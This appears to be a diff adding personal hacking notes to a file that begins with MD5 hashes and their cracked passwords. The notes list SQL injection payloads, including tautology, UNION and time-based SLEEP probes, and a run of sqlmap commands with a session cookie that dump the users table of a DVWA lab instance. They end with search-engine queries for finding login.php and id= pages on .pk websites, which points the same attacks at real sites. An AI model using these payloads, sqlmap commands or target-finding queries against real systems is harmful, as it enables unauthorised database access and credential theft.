@@ -42,3 +42,62 @@ e99a18c428cb38d5f260853678922e03   MD5      abc123
 5f4dcc3b5aa765d61d8327deb882cf99   MD5      password
 
 
+'or'1'='1
+
+select id,fname,sname from users where id=''or'1'='1';
+
+
+
+'union null#
+'
+
+'union null,null#
+''
+ Syntax error: Encountered "\'" at line 1, column 71. 
+'or'1'='1
+'
+
+'or'1'='1#
+''
+
+'or'1'='1--
+
+
+time based sql injection
+
+'OR SLEEP(5)#
+'OR SLEEP(10)#
+
+cookies 
+
+sqlmap -u "#" --cookie="" --dbs --batch 
+sqlmap -u "#" --cookie="" --batch -D dvwa --tables
+sqlmap -u "#" --cookie="" --batch -D dvwa -T users --columns
+sqlmap -u "#" --cookie="" --batch -D dvwa -T users -C user,password,user_id --dump
+
+
+
+
+echo "FIRST COMMANT"
+sqlmap -u "http://192.168.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b0411c145d95fba207151f2a54e84773" --dbs --batch 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+echo "SECOND COMMANT"
+sqlmap -u "http://192.168.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b0411c145d95fba207151f2a54e84773" --batch -D dvwa --tables
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+echo "THIRD COMMANT"
+sqlmap -u "http://192.168.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b0411c145d95fba207151f2a54e84773" --batch -D dvwa -T users --columns
+echo "FOUTH COMMANT"
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+sqlmap -u "http://192.168.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=b0411c145d95fba207151f2a54e84773" --batch -D dvwa -T users -C user,password,user_id --dump
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+sqlmap -u "#" --cookie="" --dbs --batch 
+sqlmap -u "#" --cookie="" --batch -D dvwa --tables
+sqlmap -u "#" --cookie="" --batch -D dvwa -T users --columns
+sqlmap -u "#" --cookie="" --batch -D dvwa -T users -C user,password,user_id --dump
+
+
+iurl:"login.php" site:."pk"
+iurl:"index.php site:.pk id=?
+
